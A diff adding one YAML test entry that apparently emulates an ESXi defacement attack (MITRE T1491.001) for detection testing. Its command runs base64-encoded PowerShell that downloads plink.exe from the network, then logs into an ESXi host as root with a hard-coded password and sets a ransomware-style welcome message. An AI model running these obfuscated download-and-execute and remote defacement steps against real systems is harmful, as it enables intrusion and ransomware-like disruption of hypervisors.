@@ -1,0 +1,18 @@
+- id: ed79fa62-3c57-5e8c-a883-1ba828b5c916
+  name: Soumaia ART Tests - ESXi - Change Welcome Message on Direct Console User Interface (DCUI)
+  description: 'Changes the ESXi welcome message to potentially display ransom information.
+
+    [Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/esxcli/#change%20display%20information)'
+  tactic: impact
+  technique:
+    attack_id: T1491.001
+    name: 'Defacement: Internal Defacement'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABwAGwAaQBuAGsALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AdABoAGUALgBlAGEAcgB0AGgALgBsAGkALwB+AHMAZwB0AGEAdABoAGEAbQAvAHAAdQB0AHQAeQAvAGwAYQB0AGUAcwB0AC8AdwA2ADQALwBwAGwAaQBuAGsALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAHAAbABpAG4AawAuAGUAeABlACIACgA=
+          )
+          echo "" | "%TEMP%\ART-ExternalPayloads\plink.exe" -batch "atomic.local" -ssh -l root -pw "password" "esxcli system welcomemsg set -m 'RANSOMWARE-NOTIFICATION'"
